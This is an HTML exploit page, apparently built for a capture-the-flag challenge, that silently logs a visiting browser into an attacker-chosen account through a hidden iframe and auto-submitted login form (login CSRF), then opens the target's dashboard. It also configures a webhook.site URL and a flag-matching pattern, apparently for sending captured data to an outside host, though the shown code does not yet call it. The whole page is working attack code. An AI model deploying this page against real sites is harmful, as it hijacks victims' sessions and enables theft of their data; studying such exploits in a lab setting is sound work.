<html>
  <head>
      <meta charset="UTF-8">
      <title>Loading...</title>
  </head>
  <body>
      <h1>Loading...</h1>
      <script>
          // Configuration
          const WEBHOOK_URL = 'https://webhook.site/ce81270b-afd7-4d83-bedd-e4854183bed2';
          const FLAG_PATTERN = /ASIS\{.*?\}/g;

          // Get malicious username from URL parameter
          const urlParams = new URLSearchParams(window.location.search);
          const maliciousUsername = urlParams.get('u');

          if (!maliciousUsername) {
              document.body.innerHTML = '<h1>Error: Missing username parameter</h1>';
          } else {
              // Phase 1: Create and submit CSRF form in hidden iframe
              const iframe = document.createElement('iframe');
              iframe.style.display = 'none';
              iframe.name = 'csrf_frame';
              document.body.appendChild(iframe);

              const form = document.createElement('form');
              form.action = 'http://web/login';
              form.method = 'POST';
              form.target = 'csrf_frame';

              const usernameInput = document.createElement('input');
              usernameInput.type = 'hidden';
              usernameInput.name = 'username';
              usernameInput.value = maliciousUsername;

              const passwordInput = document.createElement('input');
              passwordInput.type = 'hidden';
              passwordInput.name = 'password';
              passwordInput.value = 'password';

              form.appendChild(usernameInput);
              form.appendChild(passwordInput);
              document.body.appendChild(form);

              // Submit the CSRF form
              form.submit();

              // Phase 2: After 1 second, open dashboard
              setTimeout(function() {
                  window.open('http://web/dashboard');
              }, 1000);
          }
      </script>
  </body>
  </html>
